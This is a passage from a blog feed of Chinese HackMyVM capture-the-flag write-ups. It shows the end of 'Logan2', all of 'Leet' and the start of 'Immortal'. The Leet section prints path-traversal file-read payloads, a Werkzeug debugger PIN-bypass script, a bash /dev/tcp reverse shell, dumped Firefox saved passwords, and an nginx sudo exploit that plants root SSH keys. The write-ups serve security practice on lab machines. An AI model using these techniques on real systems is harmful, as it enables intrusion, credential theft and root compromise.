drwxr-xr-x  4 git   git   4096 Jan 20 02:58 git
drwx------  2 kevin kevin 4096 Sep 11  2023 kevin
drwx------  3 logan logan 4096 Sep 11  2023 logan
git@logan2:/home$ cd git/
git@logan2:~$ ls -al
total 20
drwxr-xr-x 4 git  git  4096 Jan 20 02:58 .
drwxr-xr-x 5 root root 4096 Sep 11  2023 ..
-rw-r--r-- 1 git  git   123 Jan 20 02:58 .gitconfig
drwx------ 2 git  git  4096 Aug 27  2023 .ssh
drwxr-xr-x 3 git  git  4096 Sep 11  2023 gitea-repositories
git@logan2:~$ cd /tmp/
git@logan2:/tmp$ ls -al
total 32
drwxrwxrwt  8 root root 4096 Jan 20 03:53 .
drwxr-xr-x 18 root root 4096 Aug 27  2023 ..
drwxrwxrwt  2 root root 4096 Jan 20 02:58 .ICE-unix
drwxrwxrwt  2 root root 4096 Jan 20 02:58 .X11-unix
drwxrwxrwt  2 root root 4096 Jan 20 02:58 .XIM-unix
drwxrwxrwt  2 root root 4096 Jan 20 02:58 .font-unix
drwx------  3 root root 4096 Jan 20 02:58 systemd-private-0d3aa9413d3b439bb9007bce25456a9d-apache2.service-ZTwD9s
drwx------  3 root root 4096 Jan 20 02:58 systemd-private-0d3aa9413d3b439bb9007bce25456a9d-systemd-logind.service-6lKqu3
git@logan2:/tmp$ cd /mnt/
git@logan2:/mnt$ ls -al
total 8
drwxr-xr-x  2 root root 4096 Aug 27  2023 .
drwxr-xr-x 18 root root 4096 Aug 27  2023 ..
git@logan2:/mnt$ cd /tmp/
git@logan2:/tmp$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
git@logan2:/tmp$ /sbin/getcap -r / 2&gt;/dev/null
/usr/bin/ping cap_net_raw=ep
git@logan2:/tmp$ ss -tuln | grep tcp
tcp   LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*        
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*        
tcp   LISTEN 0      128             [::]:22           [::]:*        
tcp   LISTEN 0      511                *:80              *:*        
tcp   LISTEN 0      4096               *:3000            *:*        
git@logan2:/tmp$ sudo -l
Matching Defaults entries for git on logan2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User git may run the following commands on logan2:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/app.py
git@logan2:/tmp$ sudo /usr/bin/python3 /opt/app.py
 * Serving Flask app 'app'
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.205.144:8000
Press CTRL+C to quit
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 632-008-714

```

熟悉的配方，那就简单了（PIN都给了Debugger PIN: 632-008-714）

![Image](https://github.com/user-attachments/assets/ac3d324c-42a9-4b48-8e1a-999bb899c0e9)

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8889                                  
listening on [any] 8889 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.144] 58630
root@logan2:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)

```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_logan2.html</guid><pubDate>Fri, 27 Jun 2025 09:33:20 +0000</pubDate></item><item><title>hmv_Leet笔记</title><link>https://7r1UMPHK.github.io/post/hmv_Leet-bi-ji.html</link><description># hmv_Leet笔记

**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Leet

**难度**：&lt;span data-type='text' style='color: var(--b3-font-color8);'&gt;红色&lt;/span&gt;

**目标 IP**：192.168.205.208
**本机 IP**：192.168.205.141

# 1.端口枚举及服务探测

使用 `nmap` 扫描目标 IP 的开放端口：

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.208
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-28 14:28 CST
Nmap scan report for 192.168.205.208
Host is up (0.00024s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
7777/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.11.2)
MAC Address: 08:00:27:39:2C:58 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.17 seconds
```

7777 端口是 Web 服务还是 python3.11.2 的，可能是想考 SSTI，去页面看眼。

# 2.路径包含

页面是一个 L33T Converter（黑客语言转换器）

![image](https://github.com/user-attachments/assets/78a54a41-677f-4893-9236-ccbd513c99ad)

在输入框测试了 xss,ssti,sql 注入等都无果，然后发现这个下载超链接应该有点东西，谁家转换完还可以下载啊

![image](https://github.com/user-attachments/assets/014865fa-e61d-49de-ba77-da53c97db264)

看着都像一个路径包含，测试一下

![image](https://github.com/user-attachments/assets/dbda012f-0d89-4f5d-83ca-42601faaec8f)

看看有啥用户

```
┌──(kali㉿kali)-[~/test]
└─$ cat ~/Downloads/passwd|grep 'bash'
root:x:0:0:root:/root:/bin/bash
riva:x:1000:1000:,,,:/home/riva:/bin/bash
```

尝试读取 `riva` 用户的 ssh 密钥，不给读

爆破一下目录包含

```
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -c -u 'http://192.168.205.208:7777/download?filename=../../../../FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc=500,404 --hw=0
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.208:7777/download?filename=../../../../FUZZ
Total requests: 929

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000023:   200        24 L     32 W       1217 Ch     '..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd'                        
000000020:   200        24 L     32 W       1217 Ch     '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd' 
000000016:   200        24 L     32 W       1217 Ch     '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2
                                                        e/etc/passwd'                                                   
000000135:   200        15 L     109 W      806 Ch      '/etc/fstab'                                                    
000000131:   200        22 L     190 W      1042 Ch     '/etc/crontab'                                                  
000000129:   200        18 L     105 W      1046 Ch     '/etc/apt/sources.list'                                         
000000121:   200        225 L    1107 W     7178 Ch     '/etc/apache2/apache2.conf'                                     
000000138:   200        53 L     53 W       683 Ch      '/etc/group'                                                    
000000209:   200        17 L     111 W      711 Ch      '/etc/hosts.deny'                                               
000000208:   200        10 L     57 W       411 Ch      '/etc/hosts.allow'                                              
000000206:   200        7 L      22 W       188 Ch      '../../../../../../../../../../../../etc/hosts'                 
000000205:   200        7 L      22 W       188 Ch      '/etc/hosts'                                                    
000000268:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../etc/passwd'                
000000267:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../etc/passwd'             
000000266:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../etc/passwd'          
000000265:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../../etc/passwd'       
000000264:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../../../etc/passwd'    
000000263:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../../../../etc/passwd'   
000000262:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../../../../../etc/passwd'  
000000261:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../../../../../../etc/passwd' 
000000260:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../../../../../../../etc/passw
                                                        d'                                                              
000000259:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../../../../../../../../etc/pa
                                                        sswd'                                                           
000000258:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../../../../../../../../../etc
                                                        /passwd'                                                        
000000257:   200        24 L     32 W       1217 Ch     '/etc/passwd'                                                   
000000254:   200        24 L     32 W       1217 Ch     '/../../../../../../../../../../etc/passwd'                     
000000253:   200        24 L     32 W       1217 Ch     '/./././././././././././etc/passwd'                             
000000250:   200        20 L     65 W       526 Ch      '/etc/nsswitch.conf'                                            
000000249:   200        19 L     103 W      767 Ch      '/etc/netconfig'                                                
000000246:   200        7 L      40 W       286 Ch      '/etc/motd'                                                     
000000237:   200        2 L      5 W        27 Ch       '/etc/issue'                                                    
000000236:   200        353 L    1042 W     8139 Ch     '/etc/init.d/apache2'                                           
000000269:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../etc/passwd'                   
000000271:   200        24 L     32 W       1217 Ch     '../../../../../../../../../etc/passwd'                         
000000275:   200        24 L     32 W       1217 Ch     '../../../../../etc/passwd'                                     
000000283:   200        24 L     32 W       1217 Ch     'etc/passwd'                                                    
000000311:   200        24 L     32 W       1217 Ch     '../../../../../../etc/passwd&amp;=%3C%3C%3C%3C'                    
000000279:   200        24 L     32 W       1217 Ch     '../etc/passwd'                                                 
000000278:   200        24 L     32 W       1217 Ch     '../../etc/passwd'                                              
000000277:   200        24 L     32 W       1217 Ch     '../../../etc/passwd'                                           
000000274:   200        24 L     32 W       1217 Ch     '../../../../../../etc/passwd'                                  
000000276:   200        24 L     32 W       1217 Ch     '../../../../etc/passwd'                                        
000000273:   200        24 L     32 W       1217 Ch     '../../../../../../../etc/passwd'                               
000000270:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../etc/passwd'                      
000000272:   200        24 L     32 W       1217 Ch     '../../../../../../../../etc/passwd'                            
000000422:   200        122 L    387 W      3208 Ch     '/etc/ssh/sshd_config'                                          
000000400:   200        41 L     120 W      911 Ch      '/etc/rpc'                                                      
000000399:   200        3 L      6 W        63 Ch       '/etc/resolv.conf'                                              
000000699:   200        0 L      1 W        292 Ch      '/var/log/lastlog'                                              
000000750:   200        0 L      1 W        1149 Ch     '/var/run/utmp'                                                 
000000741:   200        21 L     154 W      100181 Ch   '/var/log/wtmp'                                                 
000000929:   200        24 L     32 W       1217 Ch     '///////../../../etc/passwd'                                    

Total time: 3.955495
Processed Requests: 929
Filtered Requests: 878
Requests/sec.: 234.8631
```

叫 GPT 总结了一下用处

1. `/etc/passwd`：存储系统用户账户信息的文件，包括用户名、密码（通常是加密的）、用户 ID、组 ID 等。
2. `/etc/fstab`：存储文件系统信息的文件，用于在系统启动时自动挂载文件系统。
3. `/etc/crontab`：存储 cron 作业的文件，这些作业是定时执行的任务。
4. `/etc/apt/sources.list`：Debian 系 Linux 发行版（如 Ubuntu）的软件源列表文件，用于指定软件包管理器（如 APT）从哪里下载软件包。
5. `/etc/apache2/apache2.conf`：Apache HTTP 服务器的主配置文件。
6. `/etc/group`：存储系统组信息的文件，包括组名和组成员。
7. `/etc/hosts.deny`：用于指定不允许访问系统的主机和服务。
8. `/etc/hosts.allow`：用于指定允许访问系统的主机和服务。
9. `/etc/hosts`：存储本地 DNS 解析的文件，用于将主机名映射到 IP 地址。
10. `/etc/nsswitch.conf`：控制系统名称服务切换的配置文件。
11. `/etc/netconfig`：网络配置文件，包含网络服务和协议的配置信息。
12. `/etc/motd`：系统启动时显示的消息，通常是系统信息和版权声明。
13. `/etc/issue`：显示在登录提示符之前的系统信息。
14. `/etc/init.d/apache2`：Apache HTTP 服务器的初始化脚本，用于启动和停止服务。
15. `/etc/ssh/sshd_config`：SSH 守护进程的配置文件，用于控制 SSH 服务的行为。
16. `/etc/rpc`：存储 RPC 服务信息的文件。
17. `/etc/resolv.conf`：DNS 解析器配置文件，指定 DNS 服务器地址。
18. `/var/log/lastlog`：存储用户最后登录信息的日志文件。
19. `/var/run/utmp`：存储当前登录用户信息的文件。
20. `/var/log/wtmp`：存储系统登录历史记录的日志文件。

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.208:7777/download?filename=../../../../etc/hosts  
127.0.0.1       localhost
127.0.1.1       leet.hmv

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```

有个域名，加入我们的 hosts 中，重新访问。不能说毫不相干，只能说一模一样，那还是爆破一下网址目录吧

```
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://leet.hmv:7777/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,md -b 404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://leet.hmv:7777/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 500) [Size: 14478]
/console              (Status: 200) [Size: 1563]
Progress: 7971 / 150005 (5.31%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 8345 / 150005 (5.56%)
[ERROR] context canceled
===============================================================
Finished
===============================================================
```

爆出 `/console` 我就停了，后面全是报错。访问 `/console` 他要 PIN 才可以有，用 whatweb 看看他是什么东西

```
└─$ whatweb http://leet.hmv:7777/console   
http://leet.hmv:7777/console [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.1 Python/3.11.2], IP[192.168.205.208], Python[3.11.2], Script, Title[Console // Werkzeug Debugger], Werkzeug[3.0.1]
```

# 3.PIN获取

是 Werkzeug Debugger，使用 google 搜索看有没有漏洞可以利用，找到了一篇 [github 的文章](https://github.com/wdahlenburg/werkzeug-debug-console-bypass)符合我们的利用场景

按照他的提示利用脚本

```
┌──(kali㉿kali)-[~/test]
└─$ git clone https://github.com/wdahlenburg/werkzeug-debug-console-bypass.git             
正克隆到 'werkzeug-debug-console-bypass'...
remote: Enumerating objects: 27, done.
remote: Counting objects: 100% (27/27), done.
remote: Compressing objects: 100% (22/22), done.
remote: Total 27 (delta 10), reused 10 (delta 3), pack-reused 0 (from 0)
接收对象中: 100% (27/27), 8.41 KiB | 4.20 MiB/s, 完成.
处理 delta 中: 100% (10/10), 完成.
```

打开 `werkzeug-pin-bypass.py` 修改对应点

username：我刚刚尝试读他的 ssh 密钥连 `riva` 用户的都不给我读（当然没有也读不到），就只可能是 `www-data` 和 `riva` 了，但是我猜是 www-data

modname:他给的模板是 `/usr/local/lib/python3.9/site-packages/flask/app.py`，python 版本前面探测到了，是 3.11.2，通常路径只写到 3.11，所以 `/usr/local/lib/python3.11/site-packages/flask/app.py`

![image](https://github.com/user-attachments/assets/747cb5cb-511b-4a16-9338-126db5dd7ace)

（mmp，睁眼看世界）幸好报错写了，不然我猜到明年

uuid:服务器托管接口的 Mac 地址，他给的模板是 `/sys/class/net/eth0/address`，访问了，没有这个文件，应该是换了网卡，去问了问 GPT，他说可以通过 `/etc/network/interfaces` 文件了解

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.208:7777/download?filename=../../../etc/network/interfaces             
# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).

source /etc/network/interfaces.d/*

# The loopback network interface
auto lo
iface lo inet loopback

# The primary network interface
allow-hotplug enp0s3
iface enp0s3 inet dhcp

┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.208:7777/download?filename=../../../sys/class/net/enp0s3/address
08:00:27:39:2c:58
curl: (18) end of response with 4078 bytes missing

┌──(kali㉿kali)-[~/test]
└─$ python3            
Python 3.12.8 (main, Dec 13 2024, 13:19:48) [GCC 14.2.0] on linux
Type 'help', 'copyright', 'credits' or 'license' for more information.
&gt;&gt;&gt; ''.join('08:00:27:39:2c:58'.split(':'))
'080027392c58'
&gt;&gt;&gt; print(0x080027392c58)
8796751080536

```

跑一下 `/etc/machine-id`、`/proc/sys/kernel/random/boot_id`、`/proc/self/cgroup`

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.208:7777/download?filename=../../../etc/machine-id        
f6791f240ce6407ea271e86b78ac3bdb
                                                                                                                                 
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.208:7777/download?filename=../../../proc/sys/kernel/random/boot_id
                                                                                                                                 
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.208:7777/download?filename=../../../proc/self/cgroup        
 
```

/etc/machine-id：f6791f240ce6407ea271e86b78ac3bdb

/proc/sys/kernel/random/boot_id：

/proc/self/cgroup：

跑不出来，写个脚本跑跑试试，不行就去抄其他师傅的 wp[狗头]

```
#!/bin/bash

for i in {1..200}; do
  curl -s -o /tmp/response.tmp http://192.168.205.208:7777/download?filename=../../../proc/self/cgroup
  if [ -s /tmp/response.tmp ]; then
    echo 'Attempt $i: Success'
    cat /tmp/response.tmp
    break
  else
    echo 'Attempt $i: Failed'
    rm -f /tmp/response.tmp
  fi
done
```

跑不出来，去 [HGBE](https://hackmyvm.eu/profile/?user=HGBE) 师傅那抄了一个

/proc/sys/kernel/random/boot_id：da68b9a7-336e-40df-879a-f38a6447bfe9

/proc/self/cgroup：0::/system.slice/flaskapp.service

根据他给的脚本获得 id

```
┌──(kali㉿kali)-[~/test/werkzeug-debug-console-bypass]
└─$ vim id.py                                                      
                                                                                                                                 
┌──(kali㉿kali)-[~/test/werkzeug-debug-console-bypass]
└─$ cat id.py   
machine_id = b''
for filename in 'machine-id', 'boot_id':
    try:
        with open(filename, 'rb') as f:
            value = f.readline().strip()
    except OSError:
        continue

    if value:
        machine_id += value
        break
try:
    with open('cgroup', 'rb') as f:
        machine_id += f.readline().strip().rpartition(b'/')[2]
except OSError:
    pass

print(machine_id)
                                                                                                                                 
┌──(kali㉿kali)-[~/test/werkzeug-debug-console-bypass]
└─$ echo 'f6791f240ce6407ea271e86b78ac3bdb' &gt; machine-id
                                                                                                                                 
┌──(kali㉿kali)-[~/test/werkzeug-debug-console-bypass]
└─$ echo 'da68b9a7-336e-40df-879a-f38a6447bfe9' &gt; boot_id
                                                                                                                                 
┌──(kali㉿kali)-[~/test/werkzeug-debug-console-bypass]
└─$ echo '0::/system.slice/flaskapp.service' &gt; cgroup  
                                                                                                                                 
┌──(kali㉿kali)-[~/test/werkzeug-debug-console-bypass]
└─$ chmod +x id.py  
                                                                                                                                 
┌──(kali㉿kali)-[~/test/werkzeug-debug-console-bypass]
└─$ python3 id.py    
b'f6791f240ce6407ea271e86b78ac3bdbflaskapp.service'
```

整个代码改完是这样的

```
┌──(kali㉿kali)-[~/test/werkzeug-debug-console-bypass]
└─$ cat werkzeug-pin-bypass.py  
  
#!/bin/python3
import hashlib
from itertools import chain

probably_public_bits = [
        'www-data',# username
        'flask.app',# modname
        'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
        '/opt/project/venv/lib/python3.11/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
        '8796751080536',# str(uuid.getnode()),  /sys/class/net/ens33/address 
        # Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup
        'f6791f240ce6407ea271e86b78ac3bdbflaskapp.service'
]

h = hashlib.sha1() # Newer versions of Werkzeug use SHA1 instead of MD5
for bit in chain(probably_public_bits, private_bits):
        if not bit:
                continue
        if isinstance(bit, str):
                bit = bit.encode('utf-8')
        h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
        for group_size in 5, 4, 3:
                if len(num) % group_size == 0:
                        rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                                                  for x in range(0, len(num), group_size))
                        break
        else:
                rv = num

print('Pin: ' + rv)
```

运行 werkzeug-pin-bypass.py 获得 PIN

```
┌──(kali㉿kali)-[~/test/werkzeug-debug-console-bypass]
└─$ python3 werkzeug-pin-bypass.py
Pin: 113-565-783
```

成功登入，有点尴尬哈，不是 ssti，只是单纯的 python

```
┌──(kali㉿kali)-[~/test]
└─$ sudo tcpdump -A -n icmp  #开个监听
```

```
&gt;&gt;&gt; import os
&gt;&gt;&gt; os.system('id')
0
&gt;&gt;&gt; os.system('ping -c2 192.168.205.141')
```

他回显个 0，ping 一下看有没有包

```
┌──(kali㉿kali)-[~/test]
└─$ sudo tcpdump -A -n icmp                    
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
16:30:30.290786 IP 192.168.205.208 &gt; 192.168.205.141: ICMP echo request, id 30409, seq 1, length 64
E..T..@.@.Q_............v.....og....g&lt;...................... !'#$%&amp;'()*+,-./01234567
16:30:30.290806 IP 192.168.205.141 &gt; 192.168.205.208: ICMP echo reply, id 30409, seq 1, length 64
E..T....@.W;............v.....og....g&lt;...................... !'#$%&amp;'()*+,-./01234567
16:30:31.313700 IP 192.168.205.208 &gt; 192.168.205.141: ICMP echo request, id 30409, seq 2, length 64
E..T..@.@.P...........V.v.....og............................ !'#$%&amp;'()*+,-./01234567
16:30:31.313721 IP 192.168.205.141 &gt; 192.168.205.208: ICMP echo reply, id 30409, seq 2, length 64
E..T....@.W...........^.v.....og............................ !'#$%&amp;'()*+,-./01234567

```

有包，弹个 shell 回来

```
&gt;&gt;&gt; os.system('bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1'')
```

# 4. 提权

```
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.208] 40200
bash: cannot set terminal process group (540): Inappropriate ioctl for device
bash: no job control in this shell
www-data@leet:/opt/project$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@leet:/opt/project$ sudo -l
sudo -l
Matching Defaults entries for www-data on leet:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on leet:
    (riva) NOPASSWD: /usr/bin/micro

```

可以用 `riva` 执行 `/usr/bin/micro` 使用 [gtfobins](https://gtfobins.github.io/) 搜索没有结果，那我们看看他帮助吧

```
www-data@leet:/opt/project$ /usr/bin/micro -h
Usage: micro [OPTIONS] [FILE]...
-clean
        Cleans the configuration directory
-config-dir dir
        Specify a custom location for the configuration directory
[FILE]:LINE:COL (if the `parsecursor` option is enabled)
+LINE:COL
        Specify a line and column to start the cursor at when opening a buffer
-options
        Show all option help
-debug
        Enable debug mode (enables logging to ./log.txt)
-version
        Show the version number and information

Micro's plugin's can be managed at the command line with the following commands.
-plugin install [PLUGIN]...
        Install plugin(s)
-plugin remove [PLUGIN]...
        Remove plugin(s)
-plugin update [PLUGIN]...
        Update plugin(s) (if no argument is given, updates all plugins)
-plugin search [PLUGIN]...
        Search for a plugin
-plugin list
        List installed plugins
-plugin available
        List available plugins

Micro's options can also be set via command line arguments for quick
adjustments. For real configuration, please use the settings.json
file (see 'help options').

-option value
        Set `option` to `value` for this session
        For example: `micro -syntax off file.c`

Use `micro -options` to see the full list of configuration options

```

没什么有用的信息，运行一下看看是什么

```
ww-data@leet:/var/www/html$ sudo -u riva /usr/bin/micro
```

![image](https://github.com/user-attachments/assets/bc8598d6-1641-4cb9-8c63-ace450ad38f9)

和 vim 类似文本编辑器，搜索一下有没有命令行

![image](https://github.com/user-attachments/assets/5b94dfee-41c9-4dc7-95d7-7e66d2a3aa09)

```
ctrl+b 
$ /bin/bash
riva@leet:/var/www/html$ 
```

成功进来，看了一圈都没有什么发现,把 linpeas.sh 传上去看看，也是没看到什么重要的东西，去看了 [HGBE](https://hackmyvm.eu/profile/?user=HGBE) 的 wp，发现是我不够大胆，反正我想不到从 firefox 提取密码

[Firefox Decrypt](https://github.com/unode/firefox_decrypt)

```
riva@leet:~$ python3 firefox_decrypt.py
Select the Mozilla profile you wish to decrypt
1 -&gt; zbznfk37.default
2 -&gt; guu30cui.default-esr
2

Website:   chrome://FirefoxAccounts
Username: '1db9561103ca4adc9afa6357c0a0b554'
Password: '{'version':1,'accountData':{'scopedKeys':{'https://identity.mozilla.com/apps/oldsync':{'kid':'1603273389635-IxsZ6HpGK9fL9tUfdcBqwA','k':'Q8lFF-E91kvogabSQ2yjKj7k2JHX30UDeHEriaxaCY5slUVmtQvP-e3is5GxBiUKkG3g4dQLbFRsVOYeMkjNpg','kty':'oct'},'sync:addon_storage':{'kid':'1603273389635-Ng9dJrdpVFqEoBs-R3LaTMKTiSWhWypqfmg9MJDby4U','k':'L8MGJk3tWVlmN9Sm-MmdauxuQ38fIl--NziTjg_AmjO51_-vHo70OELMwif8kqn2zE3Yqg30BLw1ndNplRzGCA','kty':'oct'}},'kSync':'43c94517e13dd64be881a6d2436ca32a3ee4d891d7df450378712b89ac5a098e6c954566b50bcff9ede2b391b106250a906de0e1d40b6c546c54e61e3248cda6','kXCS':'231b19e87a462bd7cbf6d51f75c06ac0','kExtSync':'2fc306264ded59596637d4a6f8c99d6aec6e437f1f225fbe3738938e0fc09a33b9d7ffaf1e8ef43842ccc227fc92a9f6cc4dd8aa0df404bc359dd369951cc608','kExtKbHash':'360f5d26b769545a84a01b3e4772da4cc2938925a15b2a6a7e683d3090dbcb85'}}'

Website:   http://leet.hmv
Username: 'riva'
Password: 'PGH$2r0co3L5QL'

Website:   https://hackmyvm.eu
Username: 'riva'
Password: 'lovelove80'

riva@leet:~$ sudo -l
[sudo] password for riva: 
Matching Defaults entries for riva on leet:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User riva may run the following commands on leet:
    (root) /usr/sbin/nginx
```

然后就是我们的老伙计上场了，nginx [提权方法](https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406)

```
riva@leet:~$ cat exploit.sh

echo '[+] Creating configuration...'
cat &lt;&lt; EOF &gt; /tmp/nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
        server {
                listen 1339;
                root /;
                autoindex on;
                dav_methods PUT;
        }
}
EOF
echo '[+] Loading configuration...'
sudo nginx -c /tmp/nginx_pwn.conf
echo '[+] Generating SSH Key...'
ssh-keygen
echo '[+] Display SSH Private Key for copy...'
cat .ssh/id_rsa
echo '[+] Add key to root user...'
curl -X PUT localhost:1339/root/.ssh/authorized_keys -d '$(cat .ssh/id_rsa.pub)'
echo '[+] Use the SSH key to get access'


riva@leet:~$ bash exploit.sh 
riva@leet:~/.ssh$ ssh -i id_rsa root@127.0.0.1
root@leet:~#  id
uid=0(root) gid=0(root) groups=0(root)

```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Leet-bi-ji.html</guid><pubDate>Fri, 27 Jun 2025 09:33:17 +0000</pubDate></item><item><title>hmv_Immortal</title><link>https://7r1UMPHK.github.io/post/hmv_Immortal.html</link><description># hmv_Immortal

# 0.简介

**靶机**：[hackmyvm - Immortal](https://hackmyvm.eu/machines/machine.php?vm=Immortal)
**难度**：黄色
**目标 IP**：192.168.205.223
**本机 IP**：192.168.205.141

---

# 1.扫描

`nmap` 起手，先探测端口

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap 192.168.205.223
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-03 12:20 CST
Nmap scan report for 192.168.205.223
Host is up (0.00042s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:13:BB:B5 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```

没啥好说的，有 ftp 服务先尝试**匿名登录**

---

# 2.踩点

## port 21

```bash
┌──(kali㉿kali)-[~/test]
└─$ ftp 192.168.205.223     
Connected to 192.168.205.223.
220 (vsFTPd 3.0.3)
Name (192.168.205.223:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||52564|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Feb 27  2024 .
drwxr-xr-x    2 0        115          4096 Feb 27  2024 ..
-rw-r--r--    1 0        0             504 Feb 27  2024 message.txt
226 Directory send OK.
ftp&gt; mget message.txt
mget message.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||10512|)
150 Opening BINARY mode data connection for message.txt (504 bytes).
100% |*****************************************************************************************|   504      825.81 KiB/s    00:00 ETA
226 Transfer complete.
504 bytes received in 00:00 (429.10 KiB/s)
ftp&gt; exit
221 Goodbye.                               
```

查看 message.txt 文件

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat message.txt 
Hey guys!
